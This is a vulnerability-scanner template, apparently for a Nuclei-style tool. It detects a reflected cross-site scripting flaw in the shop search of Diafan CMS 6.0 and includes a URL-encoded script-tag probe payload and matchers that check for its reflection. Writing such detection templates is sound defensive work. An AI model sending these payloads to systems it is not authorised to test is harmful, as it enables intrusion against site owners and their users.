id: "diafan-cms-xss"
name: "Diafan CMS 6.0 - Cross-Site Scripting"
severity: "medium"
description: "Diafan CMS 6.0 contains a reflected cross-site scripting vulnerability in the shop search functionality. The \"a\" parameter is not properly sanitized before being reflected in the response, allowing attackers to inject and execute arbitrary JavaScript in the context of a victim's browser."
tech:
  - "generic"
tags:
  - "xss"
  - "diafan"
  - "cms"
  - "reflected"
  - "vuln"
cwe: "CWE-79"
reference: "https://github.com/diafan/diafan"
spaExclusion: true
request:
  method: "GET"
  path: "/shop/?module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&pr1=0&pr2=0"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"><script>alert(document.domain)</script>"
      - "DIAFAN.CMS"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
